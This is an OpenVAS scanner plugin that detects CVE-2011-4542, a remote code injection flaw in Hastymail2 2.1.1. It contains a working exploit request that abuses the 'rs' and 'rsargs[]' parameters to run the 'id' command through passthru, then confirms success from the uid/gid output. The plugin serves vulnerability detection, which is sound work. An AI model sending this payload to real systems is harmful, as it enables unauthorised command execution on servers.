###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hastymail2_rs_param_remote_code_inj_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Hastymail 'rs' and 'rsargs[]' Parameters Remote Code Injection Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to inject and execute
  arbitrary malicious code with the privileges of the user running the
  application.
  Impact Level: Application/System";
tag_affected = "Hastymail2 version 2.1.1";
tag_insight = "The flaw is due to improper validation of user-supplied input via
  the 'rs' and 'rsargs[]' parameters to index.php (when 'page' is set to
  'mailbox' and 'mailbox' is set to 'Drafts'), which allows attackers to
  execute arbitrary code in the context of an affected site.";
tag_solution = "Upgrade to Hastymail2 version 2.1.1 RC2 or later,
  For updates refer to http://www.hastymail.org/downloads/";
tag_summary = "The host is running Hastymail2 and is prone to remote code
  injection vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902591");
  script_version("$Revision: 9351 $");
  script_cve_id("CVE-2011-4542");
  script_bugtraq_id(50791);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-11-25 12:12:12 +0530 (Fri, 25 Nov 2011)");
  script_name("Hastymail 'rs' and 'rsargs[]' Parameters Remote Code Injection Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50791");
  script_xref(name : "URL" , value : "https://www.dognaedis.com/vulns/DGS-SEC-3.html");
  script_xref(name : "URL" , value : "https://www.dognaedis.com/vulns/pdf/DGS-SEC-3.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_hastymail2_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Hastymail2 Location
if(!dir = get_dir_from_kb(port:port, app:"Hastymail2")){
  exit(0);
}

## Construct Attack Request
url = dir + "/index.php?page=mailbox&mailbox=Drafts";
postData = "rs=passthru&rsargs[]=asd&rsargs[]=id";
req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData);

## Send exploit and receive response
res = http_keepalive_send_recv(port:port, data:req);

## Check 'id' command worked properly or not
if(egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:res)){
  security_message(port);
}
